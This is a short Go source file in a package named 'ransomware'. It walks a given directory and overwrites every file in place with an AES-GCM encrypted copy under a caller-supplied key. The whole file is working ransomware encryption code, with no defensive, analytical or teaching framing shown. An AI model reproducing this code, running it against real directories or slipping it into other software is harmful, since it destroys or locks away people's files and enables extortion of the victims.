package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
)

func ExecuteRansom(dirPath string, key []byte) error {
	return filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			encrypt(path, key)
		}

		return nil
	})
}

func encrypt(fileName string, key []byte) error {
	fmt.Println("Encrypting", fileName)

	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("Error opening file", fileName)
		return err
	}

	contents, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file", file.Name())
		return err
	}

	ciphertext, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error creating cipher", file.Name())
		log.Default().Println(err)
		return err
	}

	gcm, err := cipher.NewGCM(ciphertext)
	if err != nil {
		fmt.Println("Error creating GCM", file.Name())
		return err
	}

	nonce := make([]byte, gcm.NonceSize())

	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Println("Error creating nonce", file.Name())
		return err
	}

	encrypted := gcm.Seal(nonce, nonce, contents, nil)

	err = os.WriteFile(file.Name(), encrypted, 0777)
	if err != nil {
		fmt.Println("Error writing to encrypted file", file.Name())
		return err
	}

	return nil
}
